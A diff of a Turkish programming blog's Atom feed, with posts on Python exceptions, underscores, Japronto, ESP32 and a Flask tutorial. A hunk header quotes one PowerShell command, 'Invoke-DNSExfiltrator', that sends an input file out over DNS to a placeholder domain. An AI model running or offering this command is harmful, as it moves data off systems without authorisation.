 &lt;p&gt;Yazımızın da sonuna geldik. Bu yazıyı okuduğum bir makale üzerinden aldım. Alıntı diyebiliriz isterseniz çalıntıda diyebilirsiniz fakat en azından bildirmeyi görevim bildiğimden dolayı bu yazıyı okumaktasınız. &lt;/p&gt;
 &lt;p&gt;Yazının orjinali: &lt;a href="http://lucumr.pocoo.org/2016/12/29/careful-with-str-format/"&gt;Careful with STR Format&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;Evet bu yazıyı da bitirdiğimize göre geleneğim haline getirmeye çalıştığım yazı sonu şarkısını aşağıda paylaşıyorum.&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://youtu.be/AlwQZAtlTFU"&gt;&lt;img alt="Rosey - Love" src="https://img.youtube.com/vi/AlwQZAtlTFU/0.jpg"&gt;&lt;/a&gt;&lt;/p&gt;</content><category term="Python string formatting"></category><category term="python format"></category><category term="python string injection"></category><category term="python injection"></category><category term="python input verification"></category></entry><entry><title>Python İstisnalar ve İstisna Yönetimi</title><link href="https://enesergun.net/python-hata-yonetimi.html" rel="alternate"></link><published>2018-05-08T23:12:00+03:00</published><updated>2018-05-08T23:12:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2018-05-08:/python-hata-yonetimi.html</id><summary type="html">&lt;p&gt;Bildiğiniz gibi yazdığınız program/uygulama bazı yazım yanlışları veya veri girişi kısımlarında gerekli kontroller ve yönetimler yapılmamışsa  programınız/uygulamanız bir hata FIRLATARAK sonlanacaktır. Üstelik bu konu zararlı kişilerce kullanılarak son kullanıcıyı mağdur etmeye kadar gidebiliyor. Konu bu haliyle zaten oldukça önemli, bu kısımda yazılımcıya oldukça fazla yük düşmekte. Nedir bunlar …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Bildiğiniz gibi yazdığınız program/uygulama bazı yazım yanlışları veya veri girişi kısımlarında gerekli kontroller ve yönetimler yapılmamışsa  programınız/uygulamanız bir hata FIRLATARAK sonlanacaktır. Üstelik bu konu zararlı kişilerce kullanılarak son kullanıcıyı mağdur etmeye kadar gidebiliyor. Konu bu haliyle zaten oldukça önemli, bu kısımda yazılımcıya oldukça fazla yük düşmekte. Nedir bunlar?&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://youtu.be/AlwQZAtlTFU"&gt;&lt;img alt="Rosey - Love" src="https://img.youtube.com/vi/AlwQZAtlTFU/0.jpg"&gt;&lt;/a&gt;&lt;/p&gt;</content><category term="python"></category><category term="Python string formatting"></category><category term="python format"></category><category term="python string injection"></category><category term="python injection"></category><category term="python input verification"></category></entry><entry><title>Python İstisnalar ve İstisna Yönetimi</title><link href="https://enesergun.net/python-hata-yonetimi.html" rel="alternate"></link><published>2018-05-08T23:12:00+03:00</published><updated>2018-05-08T23:12:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2018-05-08:/python-hata-yonetimi.html</id><summary type="html">&lt;p&gt;Bildiğiniz gibi yazdığınız program/uygulama bazı yazım yanlışları veya veri girişi kısımlarında gerekli kontroller ve yönetimler yapılmamışsa  programınız/uygulamanız bir hata FIRLATARAK sonlanacaktır. Üstelik bu konu zararlı kişilerce kullanılarak son kullanıcıyı mağdur etmeye kadar gidebiliyor. Konu bu haliyle zaten oldukça önemli, bu kısımda yazılımcıya oldukça fazla yük düşmekte. Nedir bunlar …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Bildiğiniz gibi yazdığınız program/uygulama bazı yazım yanlışları veya veri girişi kısımlarında gerekli kontroller ve yönetimler yapılmamışsa  programınız/uygulamanız bir hata FIRLATARAK sonlanacaktır. Üstelik bu konu zararlı kişilerce kullanılarak son kullanıcıyı mağdur etmeye kadar gidebiliyor. Konu bu haliyle zaten oldukça önemli, bu kısımda yazılımcıya oldukça fazla yük düşmekte. Nedir bunlar?&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;Yazdığı kodların genel istisna durumlarını yönetmelidir.&lt;/li&gt;
 &lt;li&gt;Kullanıcı girişlerini kontrol etmelidir. ( Her konuda edilmeli )&lt;/li&gt;
@@ -382,10 +608,10 @@ PS c:\DNSExfiltrator&amp;gt; Invoke-DNSExfiltrator -i inputFile -d mydomain.com 
 &lt;p&gt;Şu anlık aklıma gelen bu kadar ama eminim fazlası da vardır. Bu konu hakkında beni yeşillendirebilirsiniz. Evet istisna yönetimi bu kadar önemliyken ben de bu konu hakkında yazmak istedim. Peki Python'da istisnalar nedir? Nasıl yönetilir? Hadi başlayalım.&lt;/p&gt;
 &lt;h2&gt;Python'da istisnalar&lt;/h2&gt;
 &lt;p&gt;Python'da istisnalar Exception ile yönetilir. Python üstünde Built-in olarak gelen bir sürü istisna yöntemi ve yönetimi vardır. Bunların listesine &lt;a href="https://docs.python.org/3/library/exceptions.html"&gt;Built-in Exceptions&lt;/a&gt; linkine tıklayarak ulaşabilirsiniz. Kod olaraksa en basit şekilde aşağıda ki gibi bir kullanımı vardır.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;try: # Çalışacak kodunuz.
-    print(0/0)
-except:
-    print(&amp;quot;Hata var&amp;quot;)
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;try: # Çalışacak kodunuz.&lt;/span&gt;
+&lt;span class="c"&gt;    print(0/0)&lt;/span&gt;
+&lt;span class="c"&gt;except:&lt;/span&gt;
+&lt;span class="c"&gt;    print(&amp;quot;Hata var&amp;quot;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -400,12 +626,12 @@ except:
 &lt;p&gt;Yukarıda ki kod bloğunda kullandığımız ZeroDivisionError farkettiğiniz üzere bir built-in bir istisnadır.&lt;/p&gt;
 &lt;p&gt;Peki karşımıza gelecek bu istisnaları nasıl yöneteceğiz?&lt;/p&gt;
 &lt;p&gt;Örnek bir kod bloğunu aşağıda görebilirsiniz.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;liste = [i for i in range(0,10)]
-try:
-    for i in liste:
-        print(int(i)/0)
-except ZeroDivisionError as hata:
-    print(hata)
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;liste = [i for i in range(0,10)]&lt;/span&gt;
+&lt;span class="c"&gt;try:&lt;/span&gt;
+&lt;span class="c"&gt;    for i in liste:&lt;/span&gt;
+&lt;span class="c"&gt;        print(int(i)/0)&lt;/span&gt;
+&lt;span class="err"&gt;except ZeroDivisionError as hata:&lt;/span&gt;
+&lt;span class="err"&gt;    print(hata)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -418,18 +644,18 @@ except ZeroDivisionError as hata:
 &lt;p&gt;Peki bunlar ne işe yarar? Kısaca açıklayacak olursam:&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Raise&lt;/strong&gt;
 Raise bize istisna çıktılarını tanımlamamızı sağlar. Nasıl yani derseniz şu şekilde. Bir yazılımın sadece stringler üzerinde işlem yaptığını düşünün buraya integer bir değer girdiğimizde bize TypeError verecektir. Fakat burada Error çıktısı son kullanıcı için anlamsız olabilir veya bunu değiştirmek isteyebilirsiniz. Base bir exception üzerinden Raise ile bunu yapabilirsiniz. Aslında raise bize istediğimiz zaman bir istisna fırlatmamıza olanak sağlar. Örnek:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;i = 5
-if type(i) is int:
-    raise TypeError(&amp;quot;Integer lan bu&amp;quot;)
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;i = 5&lt;/span&gt;
+&lt;span class="err"&gt;if type(i) is int:&lt;/span&gt;
+&lt;span class="err"&gt;    raise TypeError(&amp;quot;Integer lan bu&amp;quot;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;&lt;strong&gt;Assert&lt;/strong&gt;
 Bir modül yazdınız mesela bu modül sadece Linux'da çalışsın. Bunun kontrolünü assert ile kontrol ederek gerekli bir istisnayı sağlayabilirsiniz. Yazacağınız 1 satırlık assert ile bu kontrolü sağlayabilirsiniz. Örnek kod:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;def meminfo():
-    assert (&amp;#39;linux&amp;#39; in sys.platform)
-    ac = open(&amp;quot;/proc/meminfo&amp;quot;)
-meminfo()
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;def meminfo():&lt;/span&gt;
+&lt;span class="err"&gt;    assert (&amp;#39;linux&amp;#39; in sys.platform)&lt;/span&gt;
+&lt;span class="err"&gt;    ac = open(&amp;quot;/proc/meminfo&amp;quot;)&lt;/span&gt;
+&lt;span class="err"&gt;meminfo()&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -465,7 +691,7 @@ meminfo()
 &lt;p&gt;Finally konusunda örnek yazmadım zaten yeterince açık olduğu için.&lt;/p&gt;
 &lt;p&gt;Yazımı okuduğunuz için teşekkür ederim. Bir hatam veya yanlışım olmuş ise yeşillendirirseniz sevinirim.
 &lt;strong&gt;Unutmadan&lt;/strong&gt; bu haftanın şarkısını aşağıda paylaşıyorum.&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://www.youtube.com/watch?v=nPglNjxVHiM"&gt;&lt;img alt="Skunk Anansie - Weak" src="https://img.youtube.com/vi/nPglNjxVHiM/0.jpg"&gt;&lt;/a&gt;&lt;/p&gt;</content><category term="Python exceptions"></category><category term="python istisna"></category><category term="python istisna yönetimi"></category><category term="python hata yönetimi"></category><category term="python exceptions managing"></category></entry><entry><title>Python'da alt çizgi(_)</title><link href="https://enesergun.net/python-alt-cizgi.html" rel="alternate"></link><published>2018-05-02T22:55:00+03:00</published><updated>2018-05-02T22:55:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2018-05-02:/python-alt-cizgi.html</id><summary type="html">&lt;p&gt;Selamlar, yazıya giriş yapmadan önce uyarayım bu yazı okuduğum bir makaleden anladıklarımı kapsamaktadır. Direkt olarak çeviri yapmadım kendi yorumlarımı katarak anladığımı aktarmaya çalıştım. Teşekkürler, iyi okumalar!&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://www.youtube.com/watch?v=nPglNjxVHiM"&gt;&lt;img alt="Skunk Anansie - Weak" src="https://img.youtube.com/vi/nPglNjxVHiM/0.jpg"&gt;&lt;/a&gt;&lt;/p&gt;</content><category term="python"></category><category term="Python exceptions"></category><category term="python istisna"></category><category term="python istisna yönetimi"></category><category term="python hata yönetimi"></category><category term="python exceptions managing"></category></entry><entry><title>Python'da alt çizgi(_)</title><link href="https://enesergun.net/python-alt-cizgi.html" rel="alternate"></link><published>2018-05-02T22:55:00+03:00</published><updated>2018-05-02T22:55:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2018-05-02:/python-alt-cizgi.html</id><summary type="html">&lt;p&gt;Selamlar, yazıya giriş yapmadan önce uyarayım bu yazı okuduğum bir makaleden anladıklarımı kapsamaktadır. Direkt olarak çeviri yapmadım kendi yorumlarımı katarak anladığımı aktarmaya çalıştım. Teşekkürler, iyi okumalar!&lt;/p&gt;
 &lt;p&gt;Python kodlarının çoğunda alt çizgiyi görebilirsiniz. Peki ya hiç anlamını araştırdınız mı? Malesef ben de araştırmamıştım. Aslında Python'da alt çizginin çok özel bir yeri …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Selamlar, yazıya giriş yapmadan önce uyarayım bu yazı okuduğum bir makaleden anladıklarımı kapsamaktadır. Direkt olarak çeviri yapmadım kendi yorumlarımı katarak anladığımı aktarmaya çalıştım. Teşekkürler, iyi okumalar!&lt;/p&gt;
 &lt;p&gt;Python kodlarının çoğunda alt çizgiyi görebilirsiniz. Peki ya hiç anlamını araştırdınız mı? Malesef ben de araştırmamıştım. Aslında Python'da alt çizginin çok özel bir yeri varmış. &lt;/p&gt;
 &lt;p&gt;Peki bu alt çizgi Python'da hangi amaçlar için kullanılıyormuş?&lt;/p&gt;
@@ -529,7 +755,7 @@ meminfo()
 &lt;/ol&gt;
 &lt;p&gt;Referans ve Orjinal Metin: &lt;/p&gt;
 &lt;p&gt;&lt;a href="https://hackernoon.com/understanding-the-underscore-of-python-309d1a029edc"&gt;Buradan!&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Eğer yanlış veya bildirmek istediğiniz bir şey var ise bildirmekten çekinmeyiniz. &lt;/p&gt;</content><category term="python alt çizgi"></category><category term="python alt cizgi nedir?"></category><category term="python altcizgi"></category><category term="python altçizgi"></category><category term="python underscore"></category></entry><entry><title>Japronto Neymiş?</title><link href="https://enesergun.net/japronto-neymis.html" rel="alternate"></link><published>2018-05-01T16:12:00+03:00</published><updated>2018-05-01T16:12:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2018-05-01:/japronto-neymis.html</id><summary type="html">&lt;p&gt;Uvloop ve picohttpparser tabanlı çok hızlı, ölçeklendirilebilir, asenkron bir HTTP araç takımıdır. Yazan kişi böyle söylüyor en azından. Eğer benchmark grafikleri de doğruysa ben bundan sonra bunu kullanırım.&lt;/p&gt;
+&lt;p&gt;Eğer yanlış veya bildirmek istediğiniz bir şey var ise bildirmekten çekinmeyiniz. &lt;/p&gt;</content><category term="python"></category><category term="python alt çizgi"></category><category term="python alt cizgi nedir?"></category><category term="python altcizgi"></category><category term="python altçizgi"></category><category term="python underscore"></category></entry><entry><title>Japronto Neymiş?</title><link href="https://enesergun.net/japronto-neymis.html" rel="alternate"></link><published>2018-05-01T16:12:00+03:00</published><updated>2018-05-01T16:12:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2018-05-01:/japronto-neymis.html</id><summary type="html">&lt;p&gt;Uvloop ve picohttpparser tabanlı çok hızlı, ölçeklendirilebilir, asenkron bir HTTP araç takımıdır. Yazan kişi böyle söylüyor en azından. Eğer benchmark grafikleri de doğruysa ben bundan sonra bunu kullanırım.&lt;/p&gt;
 &lt;p&gt;Hemen grafiği aşağıya iliştiriyorum. &lt;/p&gt;
 &lt;h4&gt;Performans&lt;/h4&gt;
 &lt;p&gt;&lt;img alt="Performans" src="https://github.com/squeaky-pl/japronto/raw/master/benchmarks/results.png"&gt;&lt;/p&gt;
@@ -553,7 +779,7 @@ meminfo()
 
 &lt;span class="n"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Application&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
 &lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;router&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_route&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;debug&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;debug&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -571,7 +797,7 @@ meminfo()
 &lt;p&gt;&lt;img alt="" src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/19/HTTP_pipelining2.svg/1200px-HTTP_pipelining2.svg.png"&gt;&lt;/p&gt;
 &lt;h4&gt;Benim Yorumum&lt;/h4&gt;
 &lt;p&gt;Grafiklerin doğruluğunu kabul edersek bence kesinlikle denenmesi gereken bir HTTP server. Fakat kompleks bir uygulama yazacaksanız bence bunu enine boyuna düşünmelisiniz. Çünkü burada uygulama içerisinde ki bir çok fonksiyonu elinizle yazmanız gerekecek. Bunun yerine Django, Flask gibi frameworkleri kullanmak şu aşamada bana daha mantıklı geliyor. Karşılaştırmamın hatalı olduğunu biliyorum sonuçta bu bir Framework değil bir HTTP Server.&lt;/p&gt;
-&lt;p&gt;İlgili Github Sayfası : &lt;a href="https://github.com/squeaky-pl/japronto"&gt;https://github.com/squeaky-pl/japronto&lt;/a&gt;&lt;/p&gt;</content><category term="japronto nedir?"></category><category term="introduction of japronto"></category><category term="python web server"></category><category term="python web framework"></category></entry><entry><title>ESP32 ile çalışmak</title><link href="https://enesergun.net/esp32-ile-calismak.html" rel="alternate"></link><published>2018-04-14T13:12:00+03:00</published><updated>2018-04-14T13:12:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2018-04-14:/esp32-ile-calismak.html</id><summary type="html">&lt;p&gt;Selamlar,&lt;/p&gt;
+&lt;p&gt;İlgili Github Sayfası : &lt;a href="https://github.com/squeaky-pl/japronto"&gt;https://github.com/squeaky-pl/japronto&lt;/a&gt;&lt;/p&gt;</content><category term="python"></category><category term="japronto nedir?"></category><category term="introduction of japronto"></category><category term="python web server"></category><category term="python web framework"></category></entry><entry><title>ESP32 ile çalışmak</title><link href="https://enesergun.net/esp32-ile-calismak.html" rel="alternate"></link><published>2018-04-14T13:12:00+03:00</published><updated>2018-04-14T13:12:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2018-04-14:/esp32-ile-calismak.html</id><summary type="html">&lt;p&gt;Selamlar,&lt;/p&gt;
 &lt;p&gt;Geçen hafta sonu sevdiğim bir abim daha önce almış olduğu ESP32 kartını denemem için bana getirmişti. Malesef sadece dün akşam bu kart ile ilgilenebildim. Tabi ki daha öncesinde kart hakkında araştırmalar yapmış bulundum. &lt;/p&gt;
 &lt;h4&gt;Bu kart ne işe yarar?&lt;/h4&gt;
 &lt;p&gt;Bu kart tümleşik bir kart olarak geçiyor. Kendine ait bir işlemcisi …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Selamlar,&lt;/p&gt;
@@ -673,7 +899,7 @@ meminfo()
 
 &lt;p&gt;Aşağıda ki ekran görüntüsünü de kendi ekranımdan aldım.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="esp32 Başlamak" src="images/esp32nemicya.jpg"&gt;&lt;/p&gt;
-&lt;p&gt;Okuduğunuz için teşekkürler.&lt;/p&gt;</content><category term="esp32 introduction"></category><category term="esp32 başlangıç"></category><category term="esp32 türkçe"></category><category term="esp32 kullanmak"></category></entry><entry><title>Flask ile Adım Adım Etkinlik Uygulaması Yapalım</title><link href="https://enesergun.net/flask-events-app.html" rel="alternate"></link><published>2018-02-13T22:19:00+03:00</published><updated>2018-02-13T22:19:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2018-02-13:/flask-events-app.html</id><summary type="html">&lt;p&gt;Selamlar arkadaşlar, birkaç yazı yazmak istedim hem bu arada belki bazı arkadaşların isteklerini de yerine getirmiş olurum. Amacım bu yazı serisinde Flask ile basit bir etkinlik uygulaması yapmak. Bunun için adım adım gideceğim, yazı serisinin en sonunda Bootstrap ile bir arayüz yazacağız. Sanırım en uzun yazımız da bu olacak. Neyse …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Selamlar arkadaşlar, birkaç yazı yazmak istedim hem bu arada belki bazı arkadaşların isteklerini de yerine getirmiş olurum. Amacım bu yazı serisinde Flask ile basit bir etkinlik uygulaması yapmak. Bunun için adım adım gideceğim, yazı serisinin en sonunda Bootstrap ile bir arayüz yazacağız. Sanırım en uzun yazımız da bu olacak. Neyse bu yazımızda database üzerinde modelleri oluşturacağız. Elimden geldiğince açıklayıcı olmaya çalıştım iyi okumalar dilerim.&lt;/p&gt;
+&lt;p&gt;Okuduğunuz için teşekkürler.&lt;/p&gt;</content><category term="iot &amp; elektronik"></category><category term="esp32 introduction"></category><category term="esp32 başlangıç"></category><category term="esp32 türkçe"></category><category term="esp32 kullanmak"></category></entry><entry><title>Flask ile Adım Adım Etkinlik Uygulaması Yapalım</title><link href="https://enesergun.net/flask-events-app.html" rel="alternate"></link><published>2018-02-13T22:19:00+03:00</published><updated>2018-02-13T22:19:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2018-02-13:/flask-events-app.html</id><summary type="html">&lt;p&gt;Selamlar arkadaşlar, birkaç yazı yazmak istedim hem bu arada belki bazı arkadaşların isteklerini de yerine getirmiş olurum. Amacım bu yazı serisinde Flask ile basit bir etkinlik uygulaması yapmak. Bunun için adım adım gideceğim, yazı serisinin en sonunda Bootstrap ile bir arayüz yazacağız. Sanırım en uzun yazımız da bu olacak. Neyse …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Selamlar arkadaşlar, birkaç yazı yazmak istedim hem bu arada belki bazı arkadaşların isteklerini de yerine getirmiş olurum. Amacım bu yazı serisinde Flask ile basit bir etkinlik uygulaması yapmak. Bunun için adım adım gideceğim, yazı serisinin en sonunda Bootstrap ile bir arayüz yazacağız. Sanırım en uzun yazımız da bu olacak. Neyse bu yazımızda database üzerinde modelleri oluşturacağız. Elimden geldiğince açıklayıcı olmaya çalıştım iyi okumalar dilerim.&lt;/p&gt;
 &lt;h3&gt;Flask Nedir?&lt;/h3&gt;
 &lt;p&gt;Flask bir hayat biçi.... :)&lt;/p&gt;
 &lt;p&gt;Flask bir Python frameworküdür. Tabi genelde en fazla Django bilinir. Django gerçekten her şeyiyle tam bir web frameworkdür fakat bazen bazı işleriniz için daha minimal frameworkler isteyebilirsiniz işte bu gibi durumlar için micro frameworkler ortaya çıkmaktadır. Flask ise micro frameworkdür. Hızlıca kod yazarak prototipleme yapabilirsiniz üstelik bunları MVC  yazılım mimarisi ile yapabiliyorsunuz. Flask'i kurmak için&lt;/p&gt;
@@ -687,8 +913,8 @@ meminfo()
 &lt;h3&gt;Let's go&lt;/h3&gt;
 &lt;p&gt;Proje klasörünüzü oluşturduğunuzu varsayıyorum. Proje klasörünü oluşturduktan sonra modelleri yazacağımız bir models.py dosyası oluşturalım. Routingleri main.py dosyasında yapacağız.&lt;/p&gt;
 &lt;p&gt;models.py:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;flask&lt;/span&gt; &lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Flask&lt;/span&gt;
-&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;flask_sqlalchemy&lt;/span&gt; &lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="n"&gt;SQLAlchemy&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;flask&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Flask&lt;/span&gt;
+&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;flask_sqlalchemy&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;SQLAlchemy&lt;/span&gt;
 
 &lt;span class="n"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Flask&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vm"&gt;__name__&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;SQLALCHEMY_DATABASE_URI&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;sqlite:///events.db&amp;quot;&lt;/span&gt;
@@ -708,23 +934,23 @@ meminfo()
 &lt;h3&gt;Hadi artık modellerimizi yazalım&lt;/h3&gt;
 &lt;p&gt;Burada direk olarak kodları aşağıya koyacağım, kod bloğunun altına ise açıklamalarını gireceğim.&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;events&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Model&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-    &lt;span class="nb"&gt;id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;primary_key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="n"&gt;event_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Text&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="n"&gt;nullable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="n"&gt;slug&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Text&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;nullable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="nb"&gt;id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;primary_key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;event_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Text&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="n"&gt;nullable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;slug&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Text&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;nullable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
